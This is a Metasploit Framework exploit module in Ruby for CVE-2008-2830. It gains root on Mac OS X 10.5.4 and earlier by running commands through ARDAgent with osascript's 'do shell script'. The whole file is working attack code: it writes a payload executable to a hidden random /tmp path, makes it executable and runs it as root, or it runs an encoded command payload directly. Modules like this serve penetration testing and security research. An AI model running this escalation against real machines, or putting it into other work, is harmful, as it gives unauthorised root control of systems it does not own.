##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#
# http://metasploit.com/
##
require 'msf/core'
require 'rex'
require 'msf/core/exploit/exe'
require 'msf/core/exploit/file_dropper'
require 'shellwords'

class Metasploit3 < Msf::Exploit::Local
  # failure has no side effect
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'Mac OS X <= 10.5.4 ARDAgent Root Privilege Escalation Exploit',
      'Description'   => %q{
        This module exploits a flaw in Mac OS X <= 10.5.4 (Leopard) that allows a local user
        to run any shell script as root.
      },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'joev <joev[at]metasploit.com>' ],
      'References'    =>
        [
          [ 'CVE', '2008-2830' ],
          [ 'OSVDB', '46490' ],
          [ 'BID', '29831' ],
          [ 'URL', 'http://www.macshadows.com/kb/index.php?title=ARDAgent_exploit' ]
        ],
      'Platform'      => 'osx',
      'Arch'          => [ ARCH_X86, ARCH_X86_64, ARCH_CMD ],
      'SessionTypes'  => [ 'shell', 'meterpreter' ],
      'Targets'       => [
        [ 'Automatic (native)', { 'Platform' => 'osx' } ],
        [ 'CMD',
          {
            'Platform' => 'unix',
            'Arch' => ARCH_CMD
          }
        ]
      ],
      'DefaultTarget' => 0,
      'DisclosureDate' => 'Jun 23 2008'
    ))
    register_advanced_options([
      OptString.new('TMP_FILE',
        [true,'For the native targets, specifies the path that '+
          'the executable will be dropped on the client machine.',
          '/tmp/.<random>/<random>']
      ),
    ], self.class)
  end

  # ensure target is vulnerable by checking sudo vn and checking
  # user is in admin group.
  def check
    if not root_exec("whoami").strip == 'root'
      print_error "ARDAgent escalation does not work on this system."
      return Exploit::CheckCode::Safe
    end

    # one root for you sir
    return Exploit::CheckCode::Vulnerable
  end

  def exploit
    if native_payload?
      write_file(drop_path, generate_payload_exe)
      register_files_for_cleanup(drop_path)
      cmd_exec("chmod +x #{drop_path}")
      root_exec(drop_path)
    else
      root_exec(payload.encoded)
    end
  end

  private

  # String to the file where we want to store the native 
  # Used only by native payloads.
  def drop_path
    @_drop_path ||= datastore['TMP_FILE'].gsub('<random>') { Rex::Text.rand_text_alpha(10) }
  end

  # Wraps the provided command in the osascript ARDAgent exploit so it can be exec'd as root
  def root_exec(cmd); cmd_exec("osascript -e 'tell app \"ARDAgent\" to do shell script \"#{cmd}\""); end

  def native_payload?; target.name =~ /automatic/i; end
end
